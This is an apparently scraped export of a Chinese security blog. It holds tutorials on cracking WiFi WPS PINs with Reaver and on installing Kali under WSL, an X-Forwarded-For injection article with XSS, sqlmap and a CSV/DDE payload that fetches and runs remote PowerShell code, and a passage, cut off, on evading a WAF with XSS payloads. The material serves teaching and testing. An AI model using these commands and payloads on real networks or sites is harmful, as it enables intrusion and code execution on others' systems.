<h2 id="实战三：Reaver-跑Pin码破解wifi"><a href="#实战三：Reaver-跑Pin码破解wifi" class="headerlink" title="实战三：Reaver 跑Pin码破解wifi"></a>实战三：Reaver 跑Pin码破解wifi</h2><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>PIN码共为8位，按431分段，总共穷举有11000种组合。通过获取到PIN码，并记住Bssid和PIN，后期可以通过一条命令爆出无线密码。容易碰到的问题:连接超时，卡住，路由自保护等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reave的进度表文件保存在：</span><br><span class="line">1.3版 ：/etc/reaver/MAC地址.wpc</span><br><span class="line">1.4版：/usr/local/etc/reaver/MAC地址.wpc</span><br></pre></td></tr></table></figure>

<p>开始</p>
<h3 id="2、网卡启动"><a href="#2、网卡启动" class="headerlink" title="2、网卡启动"></a>2、网卡启动</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iwconfig</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>

<h3 id="3、开启嗅探模式"><a href="#3、开启嗅探模式" class="headerlink" title="3、开启嗅探模式"></a>3、开启嗅探模式</h3><p>1）查看支持wps的ap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wash -i wlan0mon</span><br></pre></td></tr></table></figure>

<p>2)查看目前MB有没有可以破解的wifi</p>
<p>MB是54e.的可破解，54e不可破解</p>
<h3 id="4、开启破解跑pin"><a href="#4、开启破解跑pin" class="headerlink" title="4、开启破解跑pin"></a>4、开启破解跑pin</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0monmon -b B4:54:59:5A:DF:F0 -vv</span><br></pre></td></tr></table></figure>

<p>最终你就能得到wif的PIN码以及密码。把这两个记下来，一般来说wif主人过段时间就会更改密码但不会更改PIN码，这时我们只要加上-p命令，WiFi密码秒出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知道Pin码以后使用如下命令饭计算出wifi连接密码：</span><br><span class="line">reaver -i wlan0monmon -b MAC地址 -p Pin码</span><br></pre></td></tr></table></figure>

<p>总结: 此方法受信号强度和WPS保护机置等影响，尝试过几次，均信号在-70左右，均连接超时。</p>
]]></content>
      <categories>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>Win11下安装Kali Linux子系统</title>
    <url>/posts/e8a76604.html</url>
    <content><![CDATA[<blockquote>
<p>转载于：两者结合</p>
<p><a href="https://mp.weixin.qq.com/s/g4rASKdy_T0c0Mi3Ys6glA">https://mp.weixin.qq.com/s/g4rASKdy_T0c0Mi3Ys6glA</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/263658960">https://zhuanlan.zhihu.com/p/263658960</a></p>
</blockquote>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>kali 子系统安装完成后加上杂七杂八的东西还是挺大的，安装过程中会遇到点问题，比如：参考的对象类型不支持尝试的操作，但是 重启+百度可以解决所有问题。</p>
<p>还有就是 wsl 与 vmware 不兼容，一次只能使用一个，非常不利于打靶场。</p>
<p>当然我觉得新手还是先用虚拟机安装 kali，因为虚拟机有克隆功能，搞坏了还可以还原，可以使劲造，还有一个就是有些靶场需要你的kali跟它同一个网段，而在校园网中，虚拟机无法使用桥接模式，所以很难办到，总之困难还是有一点的。</p>
<p>docker 也有点问题，但是都可以解决。</p>
<p>总而言之，你会遇到许多问题，请自行决定是否安装。</p>
<h2 id="0x01-安装子系统"><a href="#0x01-安装子系统" class="headerlink" title="0x01 安装子系统"></a><strong>0x01 安装子系统</strong></h2><p>设置基本内容</p>
<ul>
<li><p>打开控制面板</p>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640.png)</p>
</li>
<li><p>系统和安全——程序——程序和功能——启用或关闭Windows功能</p>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125311.png)</p>
</li>
<li><p>适用于linux的Windows子系统（若未勾选虚拟机平台不会出现该选项）</p>
</li>
</ul>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125322.png)</p>
<ul>
<li><p>在微软商店搜索Kali</p>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125333.png)</p>
</li>
<li><p>下载安装并打开</p>
</li>
</ul>
<p>可直接通过启动cmd，并输入bash，即可直接进入Linux界面</p>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125334.png)</p>
<p>并且Windows的目录都挂载到了mnt目录下</p>
<ul>
<li>安装坑点</li>
</ul>
<p>【报错】WslRegisterDistribution failed with error: 0x800701bc</p>
<p>【原因】wsl1升级到wsl2之后，内核却没有升级，所以会出现这种错误提示</p>
<p>【解决】下载最新的wsl安装包</p>
<p>【地址】</p>
<p><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package">https://docs.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package</a></p>
<p>【报错】参考的对象类型不支持尝试的操作</p>
<p>【地址】<a href="https://blog.csdn.net/marin1993/article/details/119841299">https://blog.csdn.net/marin1993/article/details/119841299</a></p>
<p>其他的都可以在这里找到，很容易解决的错误</p>
<p><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-manual">https://docs.microsoft.com/zh-cn/windows/wsl/install-manual</a></p>
<h2 id="0x02-配置子系统"><a href="#0x02-配置子系统" class="headerlink" title="0x02 配置子系统"></a><strong>0x02 配置子系统</strong></h2><p>1、配置源并更新</p>
<p>刚安装完成的Kali Linux是非常干净的，什么软件都没有安装，所以需要手动修改一下源，并更新。以下为常用kali源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-</span><br><span class="line">#官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>我这里挑选阿里云的源，执行命令修改&#x2F;etc&#x2F;apt&#x2F;sources.list文件，并保存关闭。</p>
<blockquote>
<p>vi 好像有点错误，我使用的是 nano &#x2F;etc&#x2F;apt&#x2F;sources.list</p>
</blockquote>
<p>执行以下命令进行更新：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get dist-upgrade</span><br><span class="line">sudo apt-get clean</span><br></pre></td></tr></table></figure>

<p>等待命令执行完成后，安装python3、pip、git</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3</span><br><span class="line">sudo apt-get install git</span><br><span class="line">sudo apt-get install python3-pip</span><br></pre></td></tr></table></figure>

<p>2、安装Kali Linux常用工具</p>
<p>（存储空间有限的话安装几个工具就好）</p>
<blockquote>
<ol>
<li>msfconsole:</li>
</ol>
<p><a href="https://blog.csdn.net/m_de_g/article/details/121545937">https://blog.csdn.net/m_de_g/article/details/121545937</a></p>
<ol start="2">
<li>nmap</li>
</ol>
<p>apt-get install nmap</p>
<ol start="3">
<li>docker （报错解决方法看 0x06）</li>
</ol>
<p><a href="http://t.zoukankan.com/jiangbo44-p-12637389.html">http://t.zoukankan.com/jiangbo44-p-12637389.html</a></p>
<ol start="4">
<li>proxychains</li>
</ol>
<p>apt-get install proxychains</p>
</blockquote>
<p>这里推荐使用GitHub上一位老哥的项目，可以一键进行安装</p>
<p>项目地址：<a href="https://github.com/rikonaka/katoolin4china">https://github.com/rikonaka/katoolin4china</a></p>
<p>下面安装第三方工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/rikonaka/katoolin4china</span><br><span class="line">cd katoolin4china</span><br><span class="line">sudo pip3 install .</span><br></pre></td></tr></table></figure>

<p>（注意第三条命令最后有个点）</p>
<p>使用命令打开第三方工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo k4c</span><br></pre></td></tr></table></figure>

<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125335.png)</p>
<p>第一步输入2，进行工具安装选项</p>
<p>第二步输入0，安装所有工具。</p>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125336.png)</p>
<p>耐心等待安装完成。</p>
<p>最后msfconsole、sqlmap等工具就可以直接使用了，从此不用再等待虚拟机开机。</p>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125347.png)</p>
<p>![图片](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;640-16517603125348.png)</p>
<h2 id="0x03-GUI"><a href="#0x03-GUI" class="headerlink" title="0x03 GUI"></a>0x03 GUI</h2><p>当然为了更好的体验 Kali，我们可以安装官方推荐的 GUI —— Win-KeX。输入如下命令，进行安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y kali-win-kex</span><br></pre></td></tr></table></figure>

<p>安装完毕后，可使用如下命令启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">kex</span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">kex stop</span><br><span class="line"><span class="comment"># 窗口模式</span></span><br><span class="line">kex --win -s</span><br></pre></td></tr></table></figure>

<p>![img](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;v2-7855f1ed2357fd6880d3db5fe6bd82aa_1440w.png)</p>
<p>Win-KeX 还提供了无缝模式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 无缝模式</span></span><br><span class="line">kex --sl -s</span><br></pre></td></tr></table></figure>

<p>![img](..&#x2F;imgs&#x2F;Win11下安装Kali Linux子系统&#x2F;v2-c55ffb9412aa8d65e2b08e8b71235e75_1440w.png)</p>
<h2 id="0x04-WSL2-优化"><a href="#0x04-WSL2-优化" class="headerlink" title="0x04 WSL2 优化"></a>0x04 WSL2 优化</h2><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>随着使用时间的延长，WSL2占用的硬盘空间会越来越多，这个时候就需要对其文件进行压缩。方法如下</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br><span class="line">diskpart</span><br><span class="line"><span class="comment"># open window Diskpart</span></span><br><span class="line"><span class="built_in">select</span> vdisk file=<span class="string">&quot;C:\Users\Ci\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu20.04onWindows_79rhkp1fndgsc\LocalState\ext4.vhdx&quot;</span></span><br><span class="line"><span class="comment"># select vdisk file=&quot;C:\Users\Ci\AppData\Local\Packages\KaliLinux.54290C8133FEE_ey8k8hqnwqnmg\LocalState\ext4.vhdx&quot;</span></span><br><span class="line">attach vdisk readonly</span><br><span class="line">compact vdisk</span><br><span class="line">detach vdisk</span><br></pre></td></tr></table></figure>

<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>WSL2默认可以使用的内存大小为主机的80%,对于Linux而言即使装了桌面,一般的开发也没必要给这么多内存,分多了,反而有可能卡主机的Windows<br>操作:<br>1.打开Windows资源管理器,地址栏输入 %UserProfile% 回车,在该目录下创建一个文件, 名字为 .wslconfig ,写入内容示例如下 (我电脑8GB内存,分给WSL内存2GB,另外设置交换分区4GB)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">memory=2GB</span><br><span class="line">swap=4GB</span><br><span class="line">localhostForwarding=true</span><br></pre></td></tr></table></figure>

<p>cmd执行 wsl –shutdown 关闭WSL,再重新打开即可</p>
<h2 id="0x05-wsl-和-VMware-兼容性问题"><a href="#0x05-wsl-和-VMware-兼容性问题" class="headerlink" title="0x05 wsl 和 VMware 兼容性问题"></a>0x05 wsl 和 VMware 兼容性问题</h2><p>目前的问题是鱼与熊掌不可兼得，所以每次只能用一个，假如要用wsl2，则执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>

<p>如果要用虚拟机，则执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform</span><br></pre></td></tr></table></figure>



<h2 id="0x06-wsl-无法启动-docker-问题"><a href="#0x06-wsl-无法启动-docker-问题" class="headerlink" title="0x06 wsl 无法启动 docker 问题"></a>0x06 wsl 无法启动 docker 问题</h2><p>解决方法：<a href="https://www.jianshu.com/p/f98b04b5bcd5">https://www.jianshu.com/p/f98b04b5bcd5</a></p>
<p>报错情况：Cannot connect to the Docker daemon at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock</p>
<hr>
<p>昨天在一台新的 Windows 11 中安装了 WLS2，目的就是使用 docker。</p>
<p>Microsoft Store 中默认的 Debian 版本是 11，我在很久之前安装的是 10，照着之前的经验添加了北外镜像的 docker-ce 源，安装很顺利。</p>
<p>使用过 WSL2 的人肯定知道，WSL2 中不能使用<code>systemctl</code>，需要使用<code>service</code>来启动 docker 或其他服务。</p>
<p>于是我便启动 docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure>

<p>此时竟无法启动，查看日志：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /var/log/docker.log</span><br><span class="line">...</span><br><span class="line">Sep 13 20:47:37 xxx dockerd: failed to start daemon: Error initializing network controller: error</span><br><span class="line"> obtaining controller instance: failed to create NAT chain DOCKER: iptables failed: iptables -t nat -N D</span><br><span class="line">OCKER: iptables v1.4.21: can<span class="string">&#x27;t initialize iptables table `nat&#x27;</span>: Table does not exist (<span class="keyword">do</span> you need to ins</span><br><span class="line">mod?)</span><br></pre></td></tr></table></figure>

<p>可以看到是 iptables 的问题，此问题在其 github 仓库中有人提出过<a href="https://links.jianshu.com/go?to=https://github.com/docker/for-linux/issues/1105">#1105</a>，幸运的是，这个问题正好能被简单地解决。</p>
<p><strong>首先</strong>，将<code>iptables</code>用<code>iptables-legacy</code>替换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --<span class="built_in">set</span> iptables /usr/sbin/iptables-legacy</span><br></pre></td></tr></table></figure>

<p><strong>然后</strong>，开启 ipv4 的包转发功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sed -i <span class="string">&#x27;s/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g&#x27;</span> /etc/sysctl.conf</span><br></pre></td></tr></table></figure>

<p><strong>最后</strong>，重启 WSL2，下面的代码在 cmd 中运行：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br></pre></td></tr></table></figure>

<p>此时再启动 kali，就能顺利启动 docker了。</p>
]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>XFF注入漏洞的进阶利用</title>
    <url>/posts/e31d1783.html</url>
    <content><![CDATA[<h1 id="XFF注入漏洞的进阶利用"><a href="#XFF注入漏洞的进阶利用" class="headerlink" title="XFF注入漏洞的进阶利用"></a>XFF注入漏洞的进阶利用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章从 X-Forwarded-For 注入漏洞出发，结合XSS、Sqli、CSV注入等漏洞，挖掘其可能存在安全隐患的场景，从而更好的进行防御。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>服务端获取客户端请求IP地址，常见的包括：x-forwarded-for、client-ip等请求头，以及remote_addr参数。</p>
<p>remote_addr：指的是当前直接请求的客户端IP地址，无法伪造。</p>
<p>x-forwarded-for，即XFF，是很多代理服务器在请求转发时添加上去的，可以伪造。</p>
<p>client-ip同XFF，也是代理服务器添加的用于转发客户端请求的真实IP地址，同样保存与请求头中。</p>
<p>大多数Web网站想要获取的是用户的IP，而不是用户使用代理后的IP，所以一般都会使用x-forwarded-for来获取ip。</p>
<p>这也是X-Forwarded-For注入存在的前提。</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>X-Forwarded-For 存在 XSS 的场景一般是在后台日志记录处，因为大部分后台的日志管理处都会记录用户执行操作对应的IP，然后回显到界面中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/X-Forwarded-For%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20221010105609430.png" alt="image-20221010105609430"></p>
<p>随意访问一个功能点，使用burpsuite抓包，构造X-Forwarded-For头：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/X-Forwarded-For%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20221010111359256.png" alt="image-20221010111359256"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &lt;script&gt;console.log(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>为了避免不必要的麻烦，尽量不要使用弹窗 payload。</p>
<p>回到查看系统日志处，打开F12，查看控制台是否输出 ‘xss’ 字符。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/X-Forwarded-For%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20221010111845036.png" alt="image-20221010111845036"></p>
<h2 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h2><p>X-Forwarded-For 头存在sql注入的场景一般是网站将请求的 X-Forwarded-For 头的值保存到数据库中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/X-Forwarded-For%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20221010112417313.png" alt="image-20221010112417313"></p>
<p>1、输入登录用户名和密码Burp抓包并在数据包的请求头中添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: *</span><br></pre></td></tr></table></figure>

<p>这里的*会让sqlmap重点扫描<br>2、将包内容复制到记事本命名为test.txt，使用sqlmap直接扫。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --batch         </span><br></pre></td></tr></table></figure>

<p>如果存在sql注入的话，会直接扫出来。</p>
<h2 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a>CSV注入</h2><p>这种场景比较少见，需要满足如下条件：</p>
<p>1.后台日志记录的ip从X-Forwarded-For处获取，且没有进行过滤；</p>
<p>2.日志不经过过滤可以导出成csv表格。</p>
<p>这时候就可以 X-Forwarded-For 注入 + csv注入漏洞就有可能造成较大危害了，虽然现在注入命令执行时软件会有提示是否信任，但是企业员工是通过后台导出的表格，所以大概率会相信这个文件是安全的。</p>
<p><strong>CSV注入原理</strong></p>
<p>我们知道在 Excel 中是可以运行计算公式的： &#x3D;1+5 ，它会将以 &#x3D; 开头的单元格内容解释成公式并运行，单纯的运行计算公式可能没什么用，但这里可以用到 DDE 。<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx">Dynamic Data Exchange</a>（DDE）是一款来自微软的古老技术，它是 Windows 下的一种跨进程通信的协议，支持 Microsoft Excel， LibreOffice 和 Apache OpenOffice。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/X-Forwarded-For%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20210710210755769.png" alt="image-20210710210755769"></p>
<p>虽然单元格的内容在引号内，但由于第一个字符是**&#x3D;**，它以一个表达式的形式被处理，实际上包括 **&#x3D; - + @**这样的符号都会触发这种行为，正常来说，如果数据量比较大的情况下，管理员一般不会花那么多时间去一个个检查输入内容是否正常。</p>
<p>检测方式和 XSS 的检测方式相同，只不过需要把payload换成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: =1+1</span><br></pre></td></tr></table></figure>

<p>导出csv文件后，如果该列变成2，说明我们可以注入恶意代码。</p>
<p>例如注入powershell上线payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=cmd|&#x27;/C powershell IEX(wget url)&#x27;!A0</span><br></pre></td></tr></table></figure>



<h2 id="伪造登录IP绕过登录"><a href="#伪造登录IP绕过登录" class="headerlink" title="伪造登录IP绕过登录"></a>伪造登录IP绕过登录</h2><p>存在的场景一般是，登录后台的时候，服务器对登录IP进行了限制，例如 IP禁止访问等，403禁止访问等，只允许特定的IP访问。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/X-Forwarded-For%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20221010120226241.png" alt="image-20221010120226241"></p>
<p>尝试把 X-Forwarded-For 指定为 127.0.0.1，也许可以绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For : 127.0.0.1</span><br></pre></td></tr></table></figure>





<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.对于直接使用的 Web 应用，必须使用从TCP连接中得到的 remote_addr，才是用户真实的IP；</p>
<p>2.服务端对 X-Forwarded-For 的值进行检测和过滤，丢弃不符规范的请求。</p>
<p>3.使用waf对网站进行防护，可以有效过滤恶意payload。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是 X-Forwarded-For 注入适用的场景、攻击和防护手段。</p>
<p>X-Forwarded-For 注入虽然只是鸡肋漏洞，但是发散思维，结合各种其他漏洞，就可能收获意想不到的效果。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS绕过防护盲打某SRC官网后台</title>
    <url>/posts/73d2042e.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/RPA-eaMYeM1mnz01BHh-Uw">https://mp.weixin.qq.com/s/RPA-eaMYeM1mnz01BHh-Uw</a></p>
<p>荐语：非常不错的一篇XSS挖掘教学文章，由浅入深，通俗易懂，实用性强。</p>
</blockquote>
<h2 id="Part1-前言"><a href="#Part1-前言" class="headerlink" title="Part1 前言"></a><strong>Part1 前言</strong></h2><p>已经N年没挖SRC了，前几年曾有一段时间对XSS漏洞挖掘特别热衷，像反射型XSS、存储型XSS、DOM型XSS等挖得很上瘾，记下了很多笔记。遗憾的是多数平台都不愿意接收XSS漏洞，哪怕是存储型XSS漏洞给的评分都很低，因为XSS不能造成直接危害，利用起来有困难。所以当时花费了2天的时间，绕过各种防护及过滤，盲打到了一个SRC电商官网的后台。正好公众号文章写到现在，也缺少一篇讲解XSS漏洞的文章，<strong>这次就分享这个XSS拿权限的实战案例吧</strong>。</p>
<p><strong>注：</strong>鉴别于好多朋友之前写文章，引用真实报告的截图而忘记打码，出过好几次事故。所以ABC_123写文章的原则是，一概不贴真实截图，只贴虚拟机环境的图，还望大家谅解。</p>
<p><strong>后期会专门出一期讲解DOM型XSS漏洞挖掘的文章，欢迎大家关注公众号。</strong></p>
<h2 id="Part2-技术研究过程"><a href="#Part2-技术研究过程" class="headerlink" title="Part2 技术研究过程"></a><strong>Part2 技术研究过程</strong></h2><p> <strong>1</strong> <strong>选择一个合适的Payload</strong></p>
<p>对于挖掘XSS漏洞，我的经验是第一步就是要选择一个合适的Payload进行试验，然后逐步绕过各种防护。举个例子，你是首先选择</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>，还是选择</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>去开展XSS绕过工作呢？有朋友是用一大堆的payload做成XSS字典去FUZZ测试，这种方法高效快速，但是缺点是只能测试反射型XSS，然后工具自带的payload都是网上公开的，早就被各种WAF设备给分析过了，被拦截的可能性很大。</p>
<p> <strong>2</strong> <strong>选择<code>&lt;image&gt;</code>标签绕过</strong></p>
<p>对于<code>&lt;script&gt;</code>这种的payload，如果不是变形的，基本上现在随便一个WAF设备都能准确识别了，存活的可能性比较低。对于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>这个payload还有一些希望，但是<strong>alert</strong>关键字太明显，直接提交也是不行的。</p>
<p>于是将测试payload精简一下，变成如下格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1&gt;</span><br></pre></td></tr></table></figure>

<p>提交还是被拦截。</p>
<p>那么就再精简一下，直接提交一个**<code>&lt;img&gt;</code><strong>，发现还是被拦截，至此我们知道，</strong><code>&lt;img&gt;</code>**标签完全被干掉了。</p>
<p><code>&lt;img&gt;</code>标签不行，那么换一个<code>&lt;image&gt;</code>标签提交一下，发现没有被拦截，那么我们就选择<code>&lt;image&gt;</code>标签来开展XSS绕过工作吧。</p>
<p> <strong>3</strong> <strong>对于src&#x3D;附近的拦截绕过</strong></p>
<p>经过探测**&lt;image src&#x3D;&gt;** 中间只要有空格、TAB键都会被拦截，所以换成这种形式**&lt;image&#x2F;src&#x3D;&gt;**，用&#x2F;这个符号替代空格。</p>
<p>接下来看&#x3D;号的左右两边，程序又做了判断，<strong>src&#x3D;<strong>的右边只要是数字、字母啥的，就会被拦截。经过测试，发现</strong>src&#x3D;<strong>右边是可以接特殊字符串的，所以语句变成如下格式</strong>&lt;image&#x2F;src&#x3D;|&gt;<strong>（</strong>注：这个是特殊字符竖杠，不是字母或者数字</strong>），这样就绕过了防护。如下图所示，网页中出现了一个图片报错，说明上述payload被正常解析了，绕过了防护。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640.png" alt="图片"></p>
<p> <strong>4</strong> <strong>对于事件属性附近的拦截绕过</strong></p>
<p>接下来为了能够利用XSS漏洞拿到权限，就必须想办法让上述XSS攻击代码能够加载远程js文件，以备实现获取Cookie、添加管理员账号等功能。</p>
<p>所以只有**&lt;image&#x2F;src&#x3D;|&gt;**这个payload是不行的，还需要进一步绕过防护。</p>
<p>为了加载js链接地址执行js代码，<strong>一般可以借助事件属性加载</strong>，比如说添加鼠标点击事件、鼠标滑过事件等。这里我们选择一个onerror事件，于是将payload进一步变成**&lt;img&#x2F;src&#x3D;| onerror&#x3D;alert(111)&gt;**。</p>
<p><strong>onerror&#x3D;alert(111)<strong>这部分绕起来很难，经过一系列测试，发现在&#x3D;号左右两边加上TAB键，变成如下格式</strong>onerror &#x3D; alert(111)<strong>可以绕过&#x3D;附近的拦截，但是</strong>alert(111)</strong> 这个部分还是会被拦截，怎么办呢？我想到了借助<strong>javascript：伪协议</strong>，因为javascript:这部分可以接各种编码，之后测试的payload变成如下格式**&lt;images&#x2F;src&#x3D;| onerror &#x3D; javascript:alert(111)&gt;**</p>
<p><strong>接下来将javascript:alert(111) 编码成16进制格式：</strong></p>
<p><strong>javascript:alert(111)</strong></p>
